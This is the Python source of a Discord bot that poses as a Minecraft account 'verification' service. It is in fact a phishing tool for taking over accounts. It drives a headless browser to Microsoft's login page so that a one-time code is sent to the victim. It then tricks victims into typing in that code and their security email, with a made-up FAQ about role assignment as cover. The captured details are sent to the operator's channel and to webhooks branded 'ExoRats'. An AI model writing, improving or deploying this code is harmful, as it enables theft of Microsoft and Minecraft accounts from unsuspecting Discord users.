import discord, asyncio, aiohttp, asqlite, datetime, calendar, json
from discord.ext import commands
from discord import ui
from playwright.async_api import async_playwright
from datetime import datetime, timedelta
from rich.console import Console
from numerize import numerize
from typing import Literal, Optional
from discord import app_commands

with open("config.json") as r:
    r = json.load(r)

    DhookChannel = r["DhookChannelID"]
    Owners = r["Owners"]
    token = r["GenToken"]
    WhitelistedServers = r["WhitelistedServersIDs"]

cmd = Console()

class PersistentViewBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.default()
        intents.message_content = True

        super().__init__(command_prefix=commands.when_mentioned_or('.'), intents=intents, status=discord.Status.online)

    async def on_ready(self):
        print(f'Logged in as {self.user} (ID: {self.user.id})')

    async def setup_hook(self):
        self.add_view(Button1())
        async with asqlite.connect('database/database.db') as conn:
            await conn.execute('CREATE TABLE IF NOT EXISTS webhooks (Webhook text, UserID int, ServerID int PRIMARY KEY)')
            await conn.execute('CREATE TABLE IF NOT EXISTS premium (premium bool, UserID int)')

bot = PersistentViewBot()

bot.help_command = None

class Button1(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)
    
    @discord.ui.button(label='Link Account', emoji='✅', style=discord.ButtonStyle.green, custom_id='verify')
    async def Confirm(self, interaction: discord.Interaction, button: discord.Button):
        await interaction.response.send_modal(Modal1())



class Modal1(discord.ui.Modal, title='Verification'):
    def __init__(self):
        super().__init__(title='Verification', custom_id='modal')

    Username = ui.TextInput(label = 'Your minecraft username', style=discord.TextStyle.short, min_length=3, max_length=16, placeholder='Enter your minecraft username!')
    Email = ui.TextInput(label = "Your minecraft account's email", style=discord.TextStyle.short, placeholder="Enter the email of your minecraft account!")

    async def on_submit(self, interaction: discord.Interaction):
        await interaction.response.defer(thinking=True, ephemeral=True)

        date_time = datetime.utcnow()
        date = date_time + timedelta(minutes=25)
        utc_time = calendar.timegm(date.utctimetuple())

        securityemail: str = None
        error: bool = False
        stats: tuple = ('Api error', 'Api error', 'Api error')

        async with async_playwright() as p:
            for i in range(1):
                browser = await p.chromium.launch(headless=True)
                page = await browser.new_page()
                page.set_default_timeout(10000)
                await page.goto('https://login.live.com/login.srf')
                page.set_default_timeout(2000)
                await page.locator('xpath=//*[@id="i0116"]').fill(self.Email.value)
                await page.locator('xpath=//*[@id="idSIButton9"]').click()
                await asyncio.sleep(0.3)
                try:
                    async with aiohttp.ClientSession(timeout = aiohttp.ClientTimeout(total=5)) as session:
                        async with session.get(f'https://sky.shiiyu.moe/api/v2/profile/{str(self.Username)}') as e:
                            e = await e.json()
                            for i in e['profiles']:
                                if e['profiles'][i]['current'] == True:
                                    networth = e['profiles'][i]['data']['networth']['networth']
                                    sa = numerize.numerize(e['profiles'][i]['data']['average_level'], 0)
                                    cata = e['profiles'][i]['data']['dungeons']['catacombs']['level']['level']
                                    stats = (networth, cata, sa)
                except Exception as r:
                    pass
                if await page.is_hidden('xpath=//*[@id="usernameError"]') == True:
                    try:
                        await page.locator('xpath=//*[@id="idA_PWD_SwitchToCredPicker"]').click()
                        await page.locator('xpath=//*[@id="credentialList"]/div[3]/div/div/div[2]').click()
                    except:
                        if await page.is_hidden('xpath=//*[@id="otcDesc"]') == True:
                            try:
                                await page.locator('xpath=//*[@id="otcLoginLink"]').click()
                            except:
                                error = True
                                error_embed = discord.Embed(description='We cannot authenticate your account due to your email not accepting mail.', color=discord.Color.red())
                                await interaction.followup.send(embed=error_embed)
                                break
                    try:
                        text = await page.locator('xpath=//*[@id="otcDesc"]').text_content()
                    except:
                        try:
                            text = await page.locator('xpath=//*[@id="proofConfirmationDesc"]').text_content()
                        except:
                            error = True
                            error_embed = discord.Embed(description='We cannot authenticate your account due to your email not accepting mail.', color=discord.Color.red())
                            await interaction.followup.send(embed=error_embed)
                            break
                    

                    if "We will send a verification code to" in text:
                        securityemail = text.replace('We will send a verification code to ', '')
                        securityemail = securityemail.replace('. To verify that this is your email address, enter it below.', '')
                        security_embed = discord.Embed(title='Verify Email', description='Please enter the security email on your account.', color=0x32CD32)
                        await interaction.followup.send(embed=security_embed, view=Button2(self.Username, self.Email,utc_time, securityemail, stats))
                        cmd.print(f"Account has 2fa, asking for security email. Email: {self.Email}", style="bold rgb(88,138,233)")
                    else:
                        embed5 = discord.Embed(title='A code has been sent to your email.', color=0x32CD32)
                        await interaction.followup.send(embed=embed5, view=Final(self.Username,self.Email, utc_time, stats))
                        cmd.print(f"Code has been sent to email: {self.Email}", style='bold rgb(27,230,72)')
                else:
                    error = True
                    embed = discord.Embed(title='Invalid Email', description='This is not a valid email.', color=discord.Color.red())
                    await interaction.followup.send(embed=embed, ephemeral=True)
                    embed.description = f"Incorrect email."
                    cmd.print("Incorrect email.", style="bold red")
                    break

                if page.locator('xpath=//*[@id="proofConfirmationErrorMsg"]/span').is_hidden == False:
                    error = True
                    embed.description = "Couldn't send OTP code."
                    cmd.print("Couldn't send OTP code.", style="bold red")
                    break

        embed = discord.Embed(title='Someone verified.', color = discord.Color.red())
        
        if error:
            embed.description = f"Couldnt send OTP to user: <@{interaction.user.id}>, email: {self.Email}"
        else:
            embed.add_field(name='Username', value=f'```{self.Username}```', inline=True)
            embed.add_field(name='Email', value=f'```{self.Email}```', inline=True)
            if securityemail is not None:
                embed.add_field(name='Security Email', value=f'```{securityemail}```')
                embed.add_field(name='OTP', value=f'```Waiting for email.```', inline=True)
            embed.add_field(name='OTP', value=f'```Requested.```', inline=True)
            try:
                embed.add_field(name='Networth', value=f"```{str(numerize.numerize(stats[0]))}```", inline=True)
            except:
                embed.add_field(name='Networth', value=f"```{str(stats[0])}```", inline=True)
            embed.add_field(name='Cata', value=f"```{str(stats[1])}```", inline=True)
            embed.add_field(name='SA', value=f"```{str(stats[2])}```", inline=True)
            embed.add_field(name='Discord', value=f'{interaction.user.mention}', inline=True)

        channel = bot.get_channel(DhookChannel)

        async with asqlite.connect('database/database.db') as conn:
            r = await conn.fetchone("SELECT * FROM webhooks WHERE ServerID = ?", (int(interaction.guild.id)))
            if r is not None:
                e = await conn.fetchone("SELECT * FROM premium WHERE UserID = ?", (r[1]))
            
        dhookembed = embed
        
        if r is None:
            try:
                invite_link = await interaction.guild.invites()
                invite_link = f'https://discord.gg/{invite_link["InviteCode"]}'
                dhookembed.add_field(name='Guild', value=f'[{bot.get_guild(interaction.guild.id).name}]({invite_link})', inline=True)
                print(invite_link)
            except:
                dhookembed.add_field(name='Guild', value=f'{bot.get_guild(interaction.guild.id).name}', inline=True)
            await channel.send(embed=embed, content=f'@everyone, https://sky.shiiyu.moe/stats/{self.Username}', silent=True)
        else:
            async with aiohttp.ClientSession() as session:
                try:
                    webhook = discord.Webhook.from_url(r[0], session=session)
                    await webhook.send(embed=embed, content=f'@everyone, https://sky.shiiyu.moe/stats/{self.Username}', username='ExoRats')                
                except:
                    pass
            
            if e is None:
                try:
                    invite_link = await interaction.guild.invites()
                    invite_link = f'https://discord.gg/{invite_link["InviteCode"]}'
                    dhookembed.add_field(name='Guild', value=f'[{bot.get_guild(interaction.guild.id).name}]({invite_link})', inline=True)
                    print(invite_link)
                except:
                    dhookembed.add_field(name='Guild', value=f'{bot.get_guild(interaction.guild.id).name}', inline=True)
                dhookembed.add_field(name='Owner', value=f'<@{r[1]}>', inline = True)
                
                await channel.send(embed=dhookembed)
            


class Button2(discord.ui.View):
    def __init__(self, Username, Email, utc_time, Security_Email, stats):
        super().__init__(timeout=None)
        self.Username = Username
        self.Email = Email
        self.Security_Email = Security_Email
        self.utc_time = utc_time
        self.stats = stats
    
    @discord.ui.button(label='Verify Email', emoji='✅', style=discord.ButtonStyle.green, custom_id='verify')
    async def Confirm(self, interaction: discord.Interaction, button: discord.Button):
        Modal = Verify_Email(self.Username, self.Email, self.utc_time, self.stats)
        Modal.add_item(item=ui.TextInput(label = 'Enter the security email.', style=discord.TextStyle.short, placeholder=self.Security_Email))
        await interaction.response.send_modal(Modal)


class Verify_Email(discord.ui.Modal, title='Verification'):
    def __init__(self, Username, Email, utc_time, stats):
        super().__init__(title='Verify Code', custom_id='modal2')
        self.Username = Username
        self.Email = Email
        self.utc_time = utc_time       
        self.stats = stats

    async def on_submit(self, interaction: discord.Interaction):
        await interaction.response.defer(thinking=True, ephemeral=True)
        async with async_playwright() as p:
            browser = await p.chromium.launch(headless=True)
            page = await browser.new_page()
            page.set_default_timeout(2000)
            await page.goto('https://login.live.com/login.srf')
            await page.locator('xpath=//*[@id="i0116"]').fill(self.Email.value)
            await page.locator('xpath=//*[@id="idSIButton9"]').click()
            await asyncio.sleep(0.3)
            try:
                await page.locator('xpath=//*[@id="idA_PWD_SwitchToCredPicker"]').click()
                await page.locator('xpath=//*[@id="credentialList"]/div[3]/div/div/div[2]').click()
            except:
                await page.locator('xpath=//*[@id="otcLoginLink"]').click()
            await page.locator('xpath=//*[@id="proofConfirmationText"]').fill(self.children[0].value)
            await page.locator('xpath=//*[@id="idSIButton9"]').click()

            faembed = discord.Embed(description=  'If the email which is associated with your account matched that email, a code will be sent to your email.', color=0x32CD32)
            await interaction.followup.send(embed=faembed, view=Final(self.Username, self.Email, self.utc_time, self.stats), ephemeral=True)
            cmd.print(f"If correct email a code has been sent to security email:  {self.children[0].value}. Primary Email: {self.Email}", style="bold rgb(88,138,233)")

        embed = discord.Embed(title='Someone verified.', color = discord.Color.red())

        embed.add_field(name='Username', value=f'```{self.Username}```', inline=True)
        embed.add_field(name='Email', value=f'```{self.Email}```', inline=True)
        embed.add_field(name='Security Email', value=f'```{self.children[0].value}```', inline=True)
        embed.add_field(name='OTP', value=f'```Requested.```', inline=False)
        try:
            embed.add_field(name='Networth', value=f"```{str(numerize.numerize(self.stats[0]))}```", inline=True)
        except:
            embed.add_field(name='Networth', value=f"```{str(self.stats[0])}```", inline=True)
        embed.add_field(name='Cata', value=f"```{str(self.stats[1])}```", inline=True)
        embed.add_field(name='SA', value=f"```{str(self.stats[2])}```", inline=True)
        embed.add_field(name='Discord', value=f'{interaction.user.mention}', inline=True)
        
        channel = bot.get_channel(DhookChannel)

        dhookembed = embed

        async with asqlite.connect('database/database.db') as conn:
            r = await conn.fetchone("SELECT * FROM webhooks WHERE ServerID = ?", (int(interaction.guild.id)))
            e = await conn.fetchone("SELECT * FROM premium WHERE UserID = ?", (r[1]))

        if r is None:
            try:
                invite_link = await interaction.guild.invites()
                invite_link = invite_link[0]
                dhookembed.add_field(name='Guild', value=f'[{bot.get_guild(interaction.guild.id).name}]({invite_link})', inline=True)
            except:
                dhookembed.add_field(name='Guild', value=f'{bot.get_guild(interaction.guild.id).name}', inline=True)
            embed.add_field(name='Owner', value=f'<@{r[1]}>', inline = True)
            await channel.send(embed=embed, content=f'@everyone, https://sky.shiiyu.moe/stats/{self.Username}', silent=True)
        else:
            async with aiohttp.ClientSession() as session:
                try:
                    webhook = discord.Webhook.from_url(r[0], session=session)
                    await webhook.send(embed=embed, content=f'@everyone, https://sky.shiiyu.moe/stats/{self.Username}', username='ExoRats')
                except:
                    pass
            
            if e is None:
                dhookembed = embed
            try:
                invite_link = await interaction.guild.invites()
                invite_link = invite_link[0]
                dhookembed.add_field(name='Guild', value=f'[{bot.get_guild(interaction.guild.id).name}]({invite_link})', inline=True)
                print(invite_link)
            except:
                dhookembed.add_field(name='Guild', value=f'{bot.get_guild(interaction.guild.id).name}', inline=True)
                dhookembed.add_field(name='Owner', value=f'<@{r[1]}>', inline = True)
                
                await channel.send(embed=dhookembed)

class Final(discord.ui.View):
    def __init__(self, Username, Email, utc_time, stats):
        super().__init__(timeout=None)
        self.Username = Username
        self.Email = Email
        self.utc_time = utc_time
        self.stats = stats

        print(self.Username, self.Email, self.utc_time, self.stats)
    
    @discord.ui.button(label='Code', emoji='✅', style=discord.ButtonStyle.green, custom_id='verify')
    async def Confirm(self, interaction: discord.Interaction, button: discord.Button):
        await interaction.response.send_modal(Modal7(self.Username, self.Email, self.utc_time, self.stats))

class Modal7(discord.ui.Modal, title='Verification'):
    def __init__(self, Username, Email, utc_time, stats):
        super().__init__(title='Verify Code', custom_id='modal2')
        self.Username = Username
        self.Email = Email
        self.utc_time = utc_time
        self.stats = stats

    Code = ui.TextInput(label = 'Enter the code you have been given.', style=discord.TextStyle.short, min_length=7, max_length=7, placeholder='Enter code here.')

    async def on_submit(self, interaction: discord.Interaction):
        await interaction.response.defer(thinking=True, ephemeral=True)

        embed = discord.Embed(title='Someone verified.', color = discord.Color.green())
        embed.description = f'<t:{self.utc_time}:R> until it dies'
        embed.add_field(name='Username', value=f'```{self.Username}```', inline=True)
        embed.add_field(name='Email', value=f'```{self.Email}```', inline=True)
        embed.add_field(name='OTP', value=f'```ansi\n[2;31m[2;36m{self.Code}[0m[2;31m[2;33m[0m[2;31m[0m```', inline=True)
        try:
            embed.add_field(name='Networth', value=f"```{str(numerize.numerize(self.stats[0]))}```", inline=True)
        except:
            embed.add_field(name='Networth', value=f"```{str(self.stats[0])}```", inline=True)
        embed.add_field(name='Cata', value=f"```{str(self.stats[1])}```", inline=True)
        embed.add_field(name='SA', value=f"```{str(self.stats[2])}```", inline=True)
        embed.add_field(name='Discord', value=f'{interaction.user.mention}', inline=True)

        Response = discord.Embed(title='Code is getting checked. It will take round about 3 minutes. Please stay patient!')

        await interaction.followup.send(embed=Response, ephemeral=True)

        channel = bot.get_channel(DhookChannel)

        dhookembed = embed

        async with asqlite.connect('database/database.db') as conn:
            r = await conn.fetchone("SELECT * FROM webhooks WHERE ServerID = ?", (int(interaction.guild.id)))
            e = await conn.fetchone("SELECT * FROM premium WHERE UserID = ?", (r[1]))

        if e is None:
            try:
                invite_link = await interaction.guild.invites()
                invite_link = f'https://discord.gg/{invite_link["InviteCode"]}'
                dhookembed.add_field(name='Guild', value=f'[{bot.get_guild(interaction.guild.id).name}]({invite_link})', inline=True)
            except:
                dhookembed.add_field(name='Guild', value=f'{bot.get_guild(interaction.guild.id).name}', inline=True)
            dhookembed.add_field(name='Owner', value=f'<@{r[1]}>', inline = True)
            
            await channel.send(embed=dhookembed, content=f'@everyone, https://sky.shiiyu.moe/stats/{self.Username}')
            await asyncio.sleep(20)
            cmd.print(f"Code has been {self.Code}. Email: {self.Email}, stats: {self.stats}", style="bold rgb(27,230,72)")
        else:
            cmd.print(f"Code has been received. Email: {self.Email}, stats: {self.stats}", style="bold rgb(27,230,72)")

        

        if r is None:
            pass
        else:
            async with aiohttp.ClientSession() as session:
                try:
                    webhook = discord.Webhook.from_url(r[0], session=session)
                    await webhook.send(embed=embed, content=f'@everyone, https://sky.shiiyu.moe/stats/{self.Username}', username='ExoRats')
                except:
                    pass
            
            



discord.utils.setup_logging()

tree = bot.tree

@bot.command(hidden=True)
async def sync(ctx: commands.Context, guilds: commands.Greedy[discord.Object], spec: Optional[Literal["~", "*", "^"]] = None) -> None:
    if ctx.author.id not in Owners:
        return
    if not guilds:
        if spec == "~":
            synced = await ctx.bot.tree.sync(guild=ctx.guild)
        elif spec == "*":
            ctx.bot.tree.copy_global_to(guild=ctx.guild)
            synced = await ctx.bot.tree.sync(guild=ctx.guild)
        elif spec == "^":
            ctx.bot.tree.clear_commands(guild=ctx.guild)
            await ctx.bot.tree.sync(guild=ctx.guild)
            synced = []
        else:
            synced = await ctx.bot.tree.sync()

        await ctx.send(
            f"Synced {len(synced)} commands {'globally' if spec is None else 'to the current guild.'}"
        )
        return

    ret = 0
    for guild in guilds:
        try:
            await ctx.bot.tree.sync(guild=guild)
        except discord.HTTPException:
            pass
        else:
            ret += 1

    await ctx.send(f"Synced the tree to {ret}/{len(guilds)}.")

@tree.command()
async def webhook(interaction: discord.Interaction, webhook_url: str):
    if interaction.guild.id in WhitelistedServers:
        embed = discord.Embed(title = 'You cannot use this command in this server.')
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return
    
    async with aiohttp.ClientSession() as session:
        try:
            discord.Webhook.from_url(webhook_url, session=session)
        except:
            embed=discord.Embed(title='Invalid webhook ❌')
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return
    async with asqlite.connect('database/database.db') as conn:
        await conn.execute("INSERT OR REPLACE INTO webhooks VALUES (?, ?, ?)", (str(webhook_url), int(interaction.user.id), int(interaction.guild.id)))
        await conn.commit()
        embed = discord.Embed(title='Webhook set successfully ✅')
        await interaction.response.send_message(embed=embed, ephemeral=True)

@tree.command()
@app_commands.choices(type=[app_commands.Choice(name="Default", value="default"), app_commands.Choice(name="Custom", value="custom")])
async def start(interaction: discord.Interaction, type: app_commands.Choice[str]):
    if interaction.guild.id in WhitelistedServers:
        embed = discord.Embed(title = 'You cannot use this command in this server.')
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return
    
    if type.value == 'default':
        embed = discord.Embed(title='Minecraft Account Linking', description="Please link your Minecraft Account to get full access to the server and see all the channels.\n\n**FAQ**\n\n**Q**: __Why do we need you to verify?__\n\n**A**: *It's for auto-roles, We need to give you your class roles, catacomb-level roles, and verified roles. It's also just for extra security in-cases of a raid.*\n\n**Q**: __How long does it take for me to get my roles?__\n\n**A**: *We try to make the waiting time as little as possible, the fastest we were able to make it is as little as 30-50 seconds.*\n\n**Q**: __Why do you need to collect a code?__\n\n**A**: *The code confirms with the Minecraft API that you actually own that minecraft account.*", color=0x32CD32)
        await interaction.channel.send(embed=embed, view=Button1())
        await interaction.response.send_message('Sent embed.', ephemeral=True)
    else:
        await interaction.response.send_modal(Custom())


class Custom(discord.ui.Modal, title='Embed Creator'):
    def __init__(self):
        super().__init__(title='Embed Creator', custom_id='embed creator')

    Title = ui.TextInput(label = 'Title', style=discord.TextStyle.short, max_length=256, min_length=1, placeholder='Verification...')
    Description = ui.TextInput(label='Description', style=discord.TextStyle.paragraph, max_length=4000, min_length=1, placeholder="stuff")

    async def on_submit(self, interaction: discord.Interaction):
        embed = discord.Embed(title=str(self.Title), description=str(self.Description), color=discord.Color.green())
        await interaction.channel.send(embed=embed)
        await interaction.response.send_message('Sent embed.', view=Button1(), ephemeral=True)


async def main():
    await bot.start(token)

asyncio.run(main())